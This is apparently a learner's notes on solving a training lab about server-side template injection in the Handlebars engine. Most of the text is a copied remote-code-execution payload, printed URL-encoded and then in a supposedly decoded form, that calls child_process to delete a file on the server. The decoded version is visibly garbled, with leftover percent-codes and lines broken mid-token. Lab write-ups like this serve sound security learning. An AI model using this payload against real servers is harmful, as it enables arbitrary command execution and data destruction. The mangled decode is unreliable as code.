This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online 
that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.


initally found that this was using a handlebars template engine by submitting invalid data and getting the error message back.

then googled for an exploit and ame across this website and search for handlebars:
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection


the exploit was URL endcoded as:
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B
%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%
20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis
%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%
20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27
child%5Fprocess%27%29%2Eexec%28%27rm+/home/carlos/morale.txt%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B
%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20
%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%
7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7
D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D
%7D%0D%0A%7B%7B%2Fwith%7D%7D


and this decoded to:
{{#with "s" as |string|}}
  {{#with "e"}}
    {
{#with split as |conslist|}}
      {{this.pop}}
    %
20 {{this.push (lookup string.sub "constructor")}}
      {{this
.pop}}
      {{#with string.split as |codelist|}}
   %
20    {{this.pop}}
        {{this.push "return require('
child_process').exec('rm /home/carlos/morale.txt');"}}
        {
{this.pop}}
        {{#each conslist}}
         
 {{#with (string.sub.apply 0 codelist)}}
            {%
7Bthis}}
          {{/with}}
        {{/each%7
D}
      {{/with}}
    {{/with}}
  {{/with}
}
{{/with}}


